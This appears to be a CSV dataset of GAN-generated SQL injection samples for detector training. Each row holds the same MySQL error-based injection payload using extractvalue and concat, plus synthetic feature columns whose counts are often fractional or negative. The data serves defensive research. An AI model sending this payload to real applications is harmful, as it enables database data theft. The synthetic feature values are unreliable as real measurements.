id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000199,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.653260374808341,146.1434783935547,47.87247848510742,25.663049697875977,53.138587951660156,0.8466536998748779,45.86149978637695,19.267772674560547,1.049925684928894,0.30245015025138855,0.19927085936069489,0.3657863736152649,0.11779990047216415,3.7681682109832764,1.0076831579208374,0.31240585446357727,0.6322922706604004,0.08911386132240295,0.2716294229030609,0.16388438642024994,4.894834995269775,5.177299499511719,3.8009321689605713,0.05639191344380379,1.0593194961547852,-0.11802393198013306,-0.11049054563045502,0.33396440744400024,-0.05221986025571823,0.01053774356842041,0.10821288824081421,0.051679618656635284,2.253153085708618,0.2801527678966522,0.5548157691955566,1.1135939359664917,3.7403202056884766,0.3573421835899353,1.0343660116195679,-0.039641425013542175,0.09681936353445053,0.4410742223262787,0.00803232192993164,0.17133349180221558,-0.20405131578445435,0.16520792245864868,-0.06284446269273758,0.2311687171459198,0.1827678084373474,0.19099970161914825,0.0812322199344635,0.2593538165092468,-0.1803329885005951,-0.18152672052383423,0.06719812750816345,-0.027191780507564545,-0.06068434193730354,-0.06764829158782959,0.11279135942459106,0.18288491666316986,-0.0935719832777977,0.2419380396604538,0.20718973875045776,0.17522597312927246,0.3201514482498169,-0.044244881719350815,0.6249327063560486,-0.271332323551178,-0.004386476241052151,-0.10082264989614487,0.23095080256462097,-0.16171887516975403,0.016435958445072174,0.09700551629066467,0.004234816413372755,0.007332093548029661,0.8138089179992676,0.2862778604030609,-0.1382991224527359,-0.0255829356610775,-0.000715404748916626,4.897244930267334,0.37275242805480957,0.2939142882823944,0.13034875690937042,0.7812701463699341,-0.1811526119709015,0.11597451567649841,0.08247365802526474
GAN_000200,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7145524017411358,146.98414611816406,46.82440948486328,26.009281158447266,54.28715515136719,0.5190606713294983,46.319244384765625,18.76482391357422,0.8697095513343811,0.30468785762786865,0.18678440153598785,0.36749404668807983,0.11753401905298233,3.7948110103607178,0.9902322888374329,0.4120015799999237,0.6259320974349976,0.08327066153287888,0.29812121391296387,0.06938071548938751,4.879761219024658,5.245028972625732,3.8386282920837402,0.06944077461957932,0.9897139668464661,-0.05197512358427048,-0.06456122547388077,0.2105565369129181,0.011241971515119076,0.009945106692612171,0.15172097086906433,-0.04632135480642319,2.140437126159668,0.0916399210691452,0.5235371589660645,1.0061701536178589,3.8438398838043213,0.4378163814544678,1.0676847696304321,-0.061165373772382736,0.12486289441585541,0.544627845287323,0.06655766814947128,0.15781764686107635,-0.0846109539270401,0.11400164663791656,0.08731123805046082,0.17541645467281342,0.23457235097885132,0.27853742241859436,0.13548855483531952,0.2903590798377991,0.15353772044181824,-0.21676293015480042,-0.09574104845523834,0.010908521711826324,0.0004596635699272156,0.055713482201099396,-0.09234807640314102,0.24994656443595886,-0.1464577615261078,0.09002664685249329,0.10020994395017624,0.037151310592889786,0.3417772948741913,0.11138110607862473,0.5883174538612366,-0.031073056161403656,-0.0913039818406105,-0.05499047785997391,-0.020680755376815796,-0.24332132935523987,-0.0010773800313472748,-0.05334068834781647,-0.00533330300822854,0.010716947726905346,0.7701646089553833,0.17814113199710846,-0.027924038469791412,0.02313941717147827,-0.014098703861236572,4.946005344390869,0.4046536684036255,0.08950015902519226,0.1329995095729828,0.8233139514923096,0.03659084811806679,0.06827788054943085,-0.05549418553709984
GAN_000201,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.802356599784832,149.2961883544922,45.40067672729492,26.14653205871582,53.6577262878418,-0.037469103932380676,48.03792190551758,18.964174270629883,0.9592706561088562,0.3078981637954712,0.19912146031856537,0.37167784571647644,0.11630146205425262,3.7830233573913574,0.7103195190429688,0.5792753100395203,0.5959659218788147,0.15853138267993927,0.29003995656967163,0.04753895848989487,4.858137130737305,5.13279914855957,3.3926584720611572,0.060727041214704514,1.034306526184082,0.07226648926734924,-0.11603330820798874,0.09404562413692474,0.09342976659536362,0.0034213897306472063,0.2326931655406952,-0.1043882966041565,2.255049467086792,-0.08815550804138184,0.46494102478027344,1.1153748035430908,3.8770885467529297,0.607869565486908,1.120164155960083,0.05922365561127663,0.07730802148580551,0.3139819800853729,0.019522391259670258,0.22481569647789001,-0.11094055324792862,-0.014730669558048248,0.17055679857730865,0.2510499060153961,0.23784591257572174,0.27057409286499023,0.1519567221403122,0.1965421438217163,0.021298032253980637,-0.14395901560783386,-0.1959279626607895,0.09951825439929962,-0.010162275284528732,0.24628403782844543,-0.0325322151184082,0.29612967371940613,-0.16584953665733337,-0.06293287128210068,0.03619057685136795,0.1989583820104599,0.38922518491744995,-0.08027078956365585,0.6256526112556458,-0.015160314738750458,-0.04955494403839111,-0.04229065030813217,0.15751054883003235,-0.052109308540821075,0.025625813752412796,-0.024150922894477844,0.019886797294020653,0.006674708798527718,0.7510232925415039,0.303551584482193,0.016852937638759613,0.0684635117650032,0.07217314839363098,4.713769435882568,0.3708036243915558,0.1907287985086441,0.1865609884262085,0.8521126508712769,0.11160926520824432,-0.17772532999515533,0.04489188641309738
GAN_000202,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.916543536680411,147.4306640625,47.602901458740234,25.386594772338867,54.18992233276367,0.20821385085582733,47.031288146972656,19.04172134399414,0.9973689913749695,0.3168189227581024,0.18440987169742584,0.3691314458847046,0.11780449748039246,3.8012351989746094,0.8807814717292786,0.6805994510650635,0.6645923256874084,0.056988511234521866,0.3645968735218048,0.1417698711156845,5.005493640899658,5.1576008796691895,4.080346584320068,0.12801192700862885,1.014763593673706,-0.060594405978918076,0.026220224797725677,0.10888257622718811,-0.1697908192873001,0.015153652988374233,0.057248905301094055,0.0059538111090660095,2.045323133468628,-0.07957343757152557,0.5116588473320007,1.0717025995254517,3.8234751224517822,0.38028737902641296,1.120992660522461,0.01881101354956627,0.11437170952558517,0.4503501355648041,-0.024342849850654602,0.18525320291519165,-0.13430029153823853,0.1620311737060547,-0.02811592072248459,0.2744550406932831,0.22080181539058685,0.26895850896835327,0.11320023238658905,0.304332971572876,-0.09275661408901215,-0.07321842759847641,-0.013816539198160172,-0.1765458583831787,-0.11311490833759308,-0.08694321662187576,0.13470013439655304,0.2713419795036316,-0.04631723836064339,0.14502723515033722,-0.14178051054477692,0.06988607347011566,0.3390564024448395,0.0005177035927772522,0.5069553852081299,0.049443379044532776,-0.01840990036725998,0.01841530203819275,0.08998581767082214,-0.017203716561198235,0.011209938675165176,-0.009340658783912659,0.02535577118396759,0.0010171745670959353,0.7107242345809937,0.20776431262493134,0.10773107409477234,-0.007912942208349705,-0.09620498865842819,4.699220180511475,0.4054405391216278,0.10795588791370392,0.12244623154401779,0.8820234537124634,-0.0012982115149497986,0.2199089527130127,0.1052037850022316
GAN_000203,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.764563526410963,147.57408142089844,44.726985931396484,25.479650497436523,53.20859146118164,-0.5755119919776917,49.16973876953125,19.657623291015625,1.0105092525482178,0.29188674688339233,0.19337743520736694,0.3671194612979889,0.11864358931779861,3.777491569519043,0.9014296531677246,0.48683565855026245,0.5827754735946655,0.185318723320961,0.29183122515678406,0.04517318308353424,4.896191120147705,5.102649688720703,3.291499614715576,0.030021466314792633,0.9998739957809448,0.023863375186920166,-0.15264390408992767,0.10824942588806152,-0.09288173168897629,0.017785461619496346,0.29741960763931274,-0.10069473832845688,2.196389675140381,-0.0015885327011346817,0.43805280327796936,1.1437578201293945,3.852384328842163,0.2448994666337967,1.0250239372253418,0.19265510141849518,0.07663453370332718,0.41503089666366577,0.1522493064403534,0.19768770039081573,0.0664040744304657,0.1944560557603836,0.1498800367116928,0.20457136631011963,0.17748403549194336,0.2623260021209717,0.030059128999710083,0.27929753065109253,0.06093530356884003,-0.19935879111289978,-0.16205278038978577,-0.0873502865433693,-0.07146792113780975,0.14489027857780457,-0.14386987686157227,0.32045701146125793,-0.031966693699359894,0.07308641076087952,0.023462370038032532,0.1803656965494156,0.4066007435321808,0.03960282355546951,0.5518404245376587,0.07136251032352448,-0.1667560636997223,-0.19574373960494995,0.05078592896461487,-0.04632004350423813,-0.11638883501291275,0.07681010663509369,0.012449169531464577,0.01841571554541588,0.7531814575195312,0.18145911395549774,-0.0018556267023086548,0.056171964854002,0.020585380494594574,5.374148368835449,0.3736906349658966,0.1348189413547516,0.11118792742490768,0.8841995000839233,-0.04086078703403473,0.2563296854496002,-0.011280417442321777
GAN_000204,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.781851411383726,147.2489776611328,46.582733154296875,26.02470588684082,54.15980911254883,1.7331632375717163,46.81679153442383,18.78728675842285,0.8878519535064697,0.3254387676715851,0.1828872710466385,0.3682529628276825,0.11848089098930359,3.768528461456299,0.6714295148849487,0.45377397537231445,0.5593370795249939,0.13059505820274353,0.2784476578235626,0.07726128399372101,4.770079135894775,5.178329944610596,3.713529109954834,0.2841305434703827,1.120232343673706,0.004791511222720146,-0.053943924605846405,0.2638637125492096,-0.13173654675483704,0.010098250582814217,0.060381583869457245,0.11235963553190231,2.064544200897217,-0.09356147050857544,0.5073800086975098,1.2032488584518433,3.9177346229553223,0.46154776215553284,1.0756568908691406,-0.023762524127960205,0.0694977268576622,0.5789148211479187,-0.004170618951320648,0.17172589898109436,-0.02736179530620575,0.10167883336544037,-0.10757522284984589,0.1954512745141983,0.19914692640304565,0.1894260197877884,0.1215696632862091,0.22043034434318542,-0.16886553168296814,0.028188608586788177,0.05387405678629875,-0.09169011563062668,-0.21180303394794464,0.06301750987768173,0.025937139987945557,0.15561863780021667,0.08633487671613693,0.017462946474552155,-0.027034491300582886,0.1359809786081314,0.36160537600517273,-0.04122113436460495,0.5994371175765991,-0.08393648266792297,-0.00884722638875246,-0.06014838069677353,0.1242646649479866,-0.07049745321273804,-0.11797850579023361,0.024738654494285583,0.009948422200977802,0.01450810395181179,0.8287742733955383,0.2679302990436554,0.13563606142997742,0.02789033018052578,-0.03535253554582596,5.494617938995361,0.29575592279434204,0.09241946041584015,0.17162463068962097,0.7569411396980286,-0.2215234339237213,0.06005902215838432,-0.02095598727464676
GAN_000205,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.699858518898046,147.40838623046875,45.76658248901367,26.61970329284668,54.27761459350586,0.9216116666793823,46.06491470336914,18.626279830932617,1.0622566938400269,0.3173333406448364,0.18876859545707703,0.37015485763549805,0.1155519112944603,3.770728349685669,0.6647664904594421,0.5282682180404663,0.6110787987709045,0.1557118445634842,0.28823837637901306,-0.032240722328424454,4.979241847991943,5.229617595672607,3.6053850650787354,0.15399974584579468,1.0875905752182007,0.10395719110965729,-0.05833018198609352,0.2296852469444275,-0.03655826672911644,0.003398283151909709,0.12822771072387695,0.019658155739307404,2.147240400314331,-0.1394941359758377,0.46422484517097473,1.1715824604034424,3.934929132461548,0.5253105163574219,1.116220235824585,-0.012648910284042358,0.09576891362667084,0.4215821325778961,-0.02669685333967209,0.19066965579986572,0.000828176736831665,-0.06950017064809799,-0.025849200785160065,0.19437141716480255,0.24922412633895874,0.24757960438728333,0.12713471055030823,0.2049347162246704,-0.056867584586143494,-0.020381253212690353,0.002863312605768442,0.008990876376628876,-0.047091756016016006,0.026657212525606155,-0.0950285792350769,0.21524721384048462,0.03732126206159592,0.03525487333536148,0.04516635835170746,0.037413980811834335,0.41100114583969116,0.09144312888383865,0.6312223672866821,-0.09806300699710846,-0.09372888505458832,-0.01695708930492401,0.06072714552283287,-0.11125299334526062,-0.08279629796743393,-0.15056678652763367,0.016951434314250946,0.012490465305745602,0.756004810333252,0.296097993850708,0.11083172261714935,0.04989548400044441,0.03074052184820175,5.071889877319336,0.33592507243156433,0.14915546774864197,0.1871674358844757,0.8234894871711731,-0.08908244967460632,-0.00194515660405159,0.0322568342089653
GAN_000206,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.766604879083083,148.0205841064453,47.247867584228516,25.519594192504883,54.36191177368164,0.13899748027324677,45.868961334228516,18.58832359313965,0.9886940121650696,0.31672000885009766,0.1853308528661728,0.3703201115131378,0.11726578325033188,3.787769079208374,0.8504093289375305,0.645449697971344,0.6605604887008667,0.08502956479787827,0.3339864909648895,0.09227754920721054,4.893970966339111,5.201299667358398,3.8122005462646484,0.14912141859531403,1.0428385734558105,-0.04708696901798248,0.0278959721326828,0.12942957878112793,0.025023017078638077,0.0076673938892781734,0.15557904541492462,0.06417591124773026,2.034677743911743,-0.030162300914525986,0.4920385479927063,0.9873592257499695,3.840528726577759,0.5022792220115662,1.1065598726272583,0.038729745894670486,0.08886715769767761,0.44993191957473755,-0.04239719361066818,0.19825954735279083,-0.14648601412773132,0.003537997603416443,5.908310413360596e-05,0.24585622549057007,0.20677673816680908,0.24335671961307526,0.14120566844940186,0.2770533263683319,-0.01032622903585434,-0.035420551896095276,-0.08810385316610336,-0.08285289257764816,-0.0312737338244915,0.04689808189868927,0.08323290944099426,0.18621549010276794,-0.11042650789022446,0.040132299065589905,-0.049112945795059204,-0.009058792144060135,0.3700149357318878,-0.0062859877943992615,0.5850420594215393,0.057903096079826355,-0.027362491935491562,0.01520431786775589,0.0607885867357254,-0.13628926873207092,-0.027361027896404266,-0.023705780506134033,0.018423303961753845,0.008218556642532349,0.7469582557678223,0.22898226976394653,0.07413234561681747,0.009525447152554989,-0.017463944852352142,4.740162372589111,0.37240108847618103,0.052121490240097046,0.1409475952386856,0.8276149034500122,0.06006409600377083,0.04556140676140785,-0.06147477775812149
GAN_000207,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.835907040472458,147.74053955078125,47.401424407958984,25.86902618408203,54.237335205078125,1.4349108934402466,46.69011688232422,19.234067916870117,1.0240228176116943,0.3085824251174927,0.18421632051467896,0.36730682849884033,0.11756167560815811,3.7689573764801025,0.9688096046447754,0.5235072374343872,0.7099186778068542,0.08427981287240982,0.32410329580307007,0.1009240448474884,4.9768757820129395,5.181342124938965,4.344078063964844,0.22403404116630554,1.02445387840271,-0.10508973896503448,-0.017568565905094147,0.19254565238952637,-0.0971202403306961,0.014399386942386627,0.029908526688814163,0.07757139950990677,2.186445951461792,0.062071993947029114,0.5190469026565552,1.1349698305130005,3.731031656265259,0.23971830308437347,1.122415542602539,-0.06355981528759003,0.16775760054588318,0.4818596839904785,-0.08806183189153671,0.1384800374507904,-0.12420546263456345,0.28921887278556824,-0.08759084343910217,0.23628437519073486,0.22366313636302948,0.23743347823619843,0.035801202058792114,0.32680609822273254,-0.11098720133304596,-0.09657144546508789,0.09876320511102676,-0.13292306661605835,-0.11113572120666504,0.08379897475242615,0.18837536871433258,0.24922633171081543,0.029711700975894928,0.288288950920105,-0.0359177440404892,0.06467305123806,0.35286152362823486,0.13812872767448425,0.5805034637451172,-0.0990779772400856,-0.039741888642311096,-0.0747506394982338,-0.0699043944478035,-0.23620370030403137,-0.10452862828969955,-0.18731963634490967,0.010656260885298252,0.013079434633255005,0.7900612950325012,0.23236314952373505,0.12114745378494263,-0.043235812336206436,-0.15924841165542603,4.838340759277344,0.4049590826034546,0.16931407153606415,0.08660051226615906,0.7974182963371277,-0.25392386317253113,0.22053804993629456,0.11590848118066788
GAN_000208,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.6870440406893095,148.0384979248047,46.46733474731445,25.11138343811035,53.33416748046875,0.7827134728431702,46.85304641723633,19.15346908569336,1.0827441215515137,0.296176940202713,0.19704028964042664,0.366708904504776,0.1185641810297966,3.7749385833740234,0.7535377144813538,0.4209180772304535,0.6460673213005066,0.09768988937139511,0.28808608651161194,-0.12489844858646393,4.866974830627441,5.121628761291504,3.0434277057647705,0.03294071927666664,1.0829020738601685,-0.06590206176042557,-0.129288911819458,0.1603381484746933,-0.12344756722450256,0.010175882838666439,0.21841049194335938,0.08511463552713394,2.02555513381958,0.022484691813588142,0.504608690738678,1.0549931526184082,3.8612403869628906,0.36212047934532166,1.035459280014038,0.10415381193161011,0.06468436866998672,0.4164162874221802,-0.011259302496910095,0.17645087838172913,-0.20703743398189545,0.18316838145256042,-0.025517776608467102,0.18047437071800232,0.14382416009902954,0.19245880842208862,0.06023043394088745,0.31652072072029114,-0.10522818565368652,-0.06812483072280884,-0.011010999791324139,-0.07339292019605637,-0.15041573345661163,-0.008474959060549736,0.1134863793849945,0.1369246542453766,-0.1695849597454071,0.15642955899238586,0.09286583214998245,0.1542186737060547,0.38414862751960754,-0.03696760535240173,0.6440892219543457,-0.03192593902349472,-0.07033496350049973,-0.09993331879377365,0.20296260714530945,0.048747994005680084,0.08597368001937866,0.07957002520561218,0.013907446525990963,0.014343024231493473,0.6823050379753113,0.23433226346969604,0.0025651752948760986,0.00830709096044302,0.1039595901966095,5.021059036254883,0.3814396858215332,0.1156981810927391,0.1612318903207779,0.8209050893783569,0.009030986577272415,0.1727481484413147,-0.019931845366954803
GAN_000209,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000130,4.043617570718103,148.17538452148438,46.014217376708984,23.889551162719727,54.27797317504883,-0.019758297130465508,49.61119842529297,19.150854110717773,0.9120141267776489,0.2801521420478821,0.18129582703113556,0.37143152952194214,0.11515156924724579,3.770219326019287,0.8632746934890747,1.0100175142288208,0.6563386917114258,0.07514899224042892,0.3450973331928253,-0.17892587184906006,4.815313339233398,5.240162372589111,3.1139299869537354,0.11030299216508865,1.0436049699783325,-0.038907669484615326,-0.11554145067930222,0.03727397322654724,0.005934677552431822,0.006863566115498543,0.3345976173877716,0.2283845841884613,2.082812547683716,-0.08665990829467773,0.48473060131073,0.9613729119300842,3.8091225624084473,0.2985522150993347,1.0103825330734253,0.03189731016755104,0.06346737593412399,0.37200331687927246,-0.28369995951652527,0.24600626528263092,-0.09725715219974518,-0.007145032286643982,0.08747303485870361,0.20489881932735443,0.15370886027812958,0.2617919445037842,0.06063200533390045,0.35369759798049927,-0.14995519816875458,0.04413338750600815,-0.0893765464425087,0.050513871014118195,-0.2226668745279312,0.22721877694129944,0.18885479867458344,0.15509039163589478,0.04504039138555527,0.4565282464027405,-0.08812513947486877,-0.012702928856015205,0.3873288333415985,-0.030044998973608017,0.5639634728431702,0.12477436661720276,-0.10919985175132751,-0.058729223906993866,-0.04634709656238556,-0.16264799237251282,-0.14451634883880615,0.06320703029632568,0.022173142060637474,0.015051017515361309,0.7930970191955566,0.1714855283498764,0.17638446390628815,-0.058869216591119766,-0.01589924842119217,4.700178623199463,0.4629455804824829,0.17133380472660065,0.03987092897295952,0.8491787910461426,0.1458645761013031,0.39648473262786865,0.06100890785455704
GAN_000210,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.6754019315650974,147.9766845703125,46.73188781738281,26.584331512451172,54.157772064208984,0.6786157488822937,46.60210037231445,18.562679290771484,0.9146286845207214,0.3018997311592102,0.18594269454479218,0.3685127794742584,0.11792408674955368,3.7660481929779053,0.84486323595047,0.5640919208526611,0.7357571721076965,0.12647753953933716,0.28594741225242615,0.03616901859641075,4.787859916687012,5.224702835083008,3.7248189449310303,0.09317026287317276,1.0532703399658203,-0.0075125545263290405,-0.03563933074474335,0.20628459751605988,0.05435370281338692,0.01459875050932169,0.17052102088928223,-0.04186885058879852,2.1736092567443848,0.06708399951457977,0.4940345287322998,1.111628532409668,3.888608455657959,0.43662452697753906,1.0336570739746094,-0.07231223583221436,0.08805003762245178,0.45796141028404236,0.057009026408195496,0.19372957944869995,-0.056406598538160324,0.06679636240005493,0.050820425152778625,0.18222063779830933,0.1620217263698578,0.24223455786705017,0.14806637167930603,0.3057229816913605,0.09153451025485992,-0.04470382630825043,-0.11557352542877197,0.05983417108654976,0.06275142729282379,0.16262832283973694,-0.023733168840408325,0.18481692671775818,-0.07608126103878021,0.024008817970752716,0.03750724345445633,0.10169261693954468,0.3340393900871277,0.003964196890592575,0.6265648007392883,-0.05121908336877823,-0.04373212903738022,0.04760337993502617,0.05256427824497223,-0.10346566885709763,-0.1165328398346901,0.06530836224555969,0.01254394929856062,0.014639445580542088,0.7905181646347046,0.2530505061149597,0.05852918326854706,0.023580169305205345,0.06017274782061577,5.213295936584473,0.3604733943939209,0.2031393051147461,0.15085206925868988,0.8078911304473877,-0.0425165519118309,0.08741123974323273,0.01663556694984436
GAN_000211,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.864465154682741,147.90431213378906,46.85783004760742,24.652849197387695,53.2626838684082,0.648163378238678,47.698970794677734,19.49005889892578,1.3153777122497559,0.2862188220024109,0.18916106224060059,0.3698630928993225,0.11619165539741516,3.7714240550994873,0.8344422578811646,0.6303970217704773,0.6785625219345093,0.12029769271612167,0.24898624420166016,-0.10152585804462433,4.971436023712158,4.958278656005859,3.1913299560546875,0.0934339389204979,1.0227892398834229,-0.0423276424407959,-0.05620056763291359,0.19590607285499573,-0.21984243392944336,-0.002623963635414839,0.2847336232662201,0.15765047073364258,2.078099012374878,0.05205138027667999,0.4618991017341614,0.9961954951286316,3.7193572521209717,0.11722041666507721,1.0642679929733276,0.2288382202386856,0.09545540809631348,0.4531620740890503,0.07975047826766968,0.1815091371536255,-0.07894284278154373,0.15437690913677216,-0.07086984068155289,0.23395174741744995,0.10584859549999237,0.21058312058448792,0.06114475429058075,0.4006038010120392,-0.15022628009319305,-0.11356326937675476,-0.011073979549109936,-0.10566379874944687,-0.09088379144668579,0.05283678323030472,0.0772329717874527,0.09637577086687088,-0.17091235518455505,0.33473849296569824,-0.004645213484764099,0.0897480696439743,0.47363990545272827,0.07108822464942932,0.6315705180168152,-0.031751349568367004,-0.10054553300142288,-0.29845526814460754,0.11617270112037659,-0.15919934213161469,-0.19992369413375854,-0.052540212869644165,0.019420066848397255,0.029824301600456238,0.5410541296005249,0.13417105376720428,0.12937049567699432,-0.003951926250010729,0.00812133401632309,4.770087242126465,0.3794459104537964,0.13796211779117584,0.043692078441381454,0.9244344830513,-0.04736762493848801,0.24065646529197693,-0.12347256392240524
GAN_000212,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.913980593721501,146.52491760253906,45.39959716796875,24.7520694732666,54.480735778808594,0.020440148189663887,49.154701232910156,19.659961700439453,1.1914639472961426,0.2954118251800537,0.18173573911190033,0.36622923612594604,0.11691438406705856,3.7585136890411377,0.9769124984741211,0.8149757981300354,0.7166351675987244,0.10643657296895981,0.22305335104465485,0.111029714345932,4.896490097045898,5.0146260261535645,3.85483980178833,0.13393694162368774,1.0163108110427856,-0.11791892349720001,-0.19658859074115753,0.17802709341049194,-0.2187664806842804,0.0075613209046423435,0.2551289200782776,0.05958978086709976,2.282370090484619,-0.07056419551372528,0.46328914165496826,1.074065923690796,3.7494864463806152,0.03301243856549263,1.03872811794281,0.12988907098770142,0.12013357877731323,0.3722817599773407,-0.023056156933307648,0.222023144364357,0.06584224104881287,0.26709312200546265,-0.021602429449558258,0.25775039196014404,0.11862404644489288,0.18073266744613647,0.021863043308258057,0.4241660237312317,-0.15950201451778412,-0.1941693127155304,0.015055572614073753,-0.09705976396799088,-0.0759003609418869,0.08270043134689331,0.11395145952701569,0.20520800352096558,0.010908126831054688,0.46688616275787354,-0.11770382523536682,0.17719173431396484,0.3843643367290497,0.14448881149291992,0.5619012713432312,-0.0070933327078819275,-0.0791485458612442,-0.23263338208198547,-0.07999575883150101,-0.206146702170372,-0.25505027174949646,-0.0022102370858192444,0.017943352460861206,0.027848003432154655,0.6594422459602356,0.14602820575237274,0.16434630751609802,-0.015380402095615864,-0.13251706957817078,5.101429462432861,0.3675583600997925,0.23145020008087158,0.0072964089922606945,0.8600662350654602,-0.2158975452184677,0.4909435212612152,-0.055909208953380585
